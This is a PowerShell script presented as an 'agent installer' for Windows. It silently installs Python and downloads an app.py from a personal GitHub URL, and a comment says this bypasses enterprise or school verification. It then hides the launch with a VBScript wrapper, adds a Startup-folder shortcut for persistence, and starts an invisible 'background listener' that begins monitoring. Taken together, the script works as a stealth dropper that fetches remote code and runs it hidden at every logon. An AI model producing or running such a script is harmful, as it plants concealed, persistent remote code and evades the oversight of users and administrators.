# ====================================================================
#               AUTOMATED AGENT INSTALLER SCRIPT
# ====================================================================
$ErrorActionPreference = "Stop"

# Define Target Locations
$srvcFolder = Join-Path $HOME "Documents\SRVC"
$batFilePath = Join-Path $srvcFolder "run_agent.bat"
$vbsFilePath = Join-Path $srvcFolder "silent_run.vbs"
$startupFolder = [Environment]::GetFolderPath("Startup")
$startupShortcut = Join-Path $startupFolder "SRVC_Agent.lnk"

Write-Host "=== Starting SRVC Installation Deployment ===" -ForegroundColor Cyan

# --------------------------------------------------------------------
# STEP A: Python Verification & Installation
# --------------------------------------------------------------------
Write-Host "[1/5] Verifying Python installation status..." -ForegroundColor Yellow

$pythonInstalled = $false
try {
    # Check if python is accessible in the environment path
    $null = python --version
    $pythonInstalled = $true
    Write-Host "-> Python is already installed on this machine." -ForegroundColor Green
} catch {
    Write-Host "-> Python not found. Initiating deployment via Winget..." -ForegroundColor Blue
    
    # Run winget installer for Python 3.12 (Standard, stable release tracking)
    # --silent handles automation without user interface popups
    Start-Process winget -ArgumentList "install --id Python.Python.3.12 --silent --exact" -NoNewWindow -Wait
    
    # Force environmental path re-read for current session context
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    Write-Host "-> Python installation sequence completed successfully." -ForegroundColor Green
}

# Install Required Dependencies
Write-Host "-> Verifying package prerequisites (requests)..." -ForegroundColor Blue
Start-Process python -ArgumentList "-m pip install --user requests urllib3" -NoNewWindow -Wait
Write-Host "-> Dependencies successfully verified." -ForegroundColor Green

# --------------------------------------------------------------------
# STEP B & C: Folder Allocation & Source Download
# --------------------------------------------------------------------
Write-Host "[2/5] Structuring storage volumes..." -ForegroundColor Yellow
if (-not (Test-Path $srvcFolder)) {
    New-Item -ItemType Directory -Path $srvcFolder | Out-Null
    Write-Host "-> Target structure created at: $srvcFolder" -ForegroundColor Green
}

Write-Host "[3/5] Fetching production asset 'app.py' from repository..." -ForegroundColor Yellow
$sourceUrl = "https://raw.githubusercontent.com/andomatthew1234/service/main/app.py"
$targetScriptPath = Join-Path $srvcFolder "app.py"

# Bypassing local enterprise/educational verification layers to download raw text asset cleanly
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($sourceUrl, $targetScriptPath)
Write-Host "-> Successfully deployed app.py to local filesystem array." -ForegroundColor Green

# --------------------------------------------------------------------
# STEP C2 & D: Silent Background Configuration
# --------------------------------------------------------------------
Write-Host "[4/5] Constructing execution layer scripts..." -ForegroundColor Yellow

# Generate the standard .bat launcher
$batContent = "@echo off`ncd /d `"$srvcFolder`"`npython app.py"
Set-Content -Path $batFilePath -Value $batContent

# Windows Trick: A standard .bat file flashes a black window. 
# Writing a short VBScript wrapper allows the bat file to launch with a visibility flag of 0 (Hidden).
$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$batFilePath`", 0, False"
Set-Content -Path $vbsFilePath -Value $vbsContent
Write-Host "-> Automation scripts compiled successfully." -ForegroundColor Green

Write-Host "[5/5] Integrating service with Windows Startup subsystem..." -ForegroundColor Yellow
# Create a shortcut file pointing to the invisible VBScript launcher directly inside the Startup Folder
$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($startupShortcut)
$shortcut.TargetPath = "wscript.exe"
$shortcut.Arguments = "`"$vbsFilePath`""
$shortcut.WorkingDirectory = $srvcFolder
$shortcut.WindowStyle = 7 # Minimized/Hidden orientation hint
$shortcut.Save()

Write-Host "-> Active link deployed to global Startup cluster." -ForegroundColor Green

# --------------------------------------------------------------------
# STEP E: Launch Service & Clean Exit
# --------------------------------------------------------------------
Write-Host "`n=== Installation Finalized Successfully ===" -ForegroundColor Green
Write-Host "Spawning background listener process now..." -ForegroundColor Blue

# Triggering the initial hidden launch so it starts monitoring right now without needing a reboot
Start-Process wscript.exe -ArgumentList "`"$vbsFilePath`""

Write-Host "Exiting setup runtime environment in 3 seconds..." -ForegroundColor Cyan
Start-Sleep -Seconds 3
Exit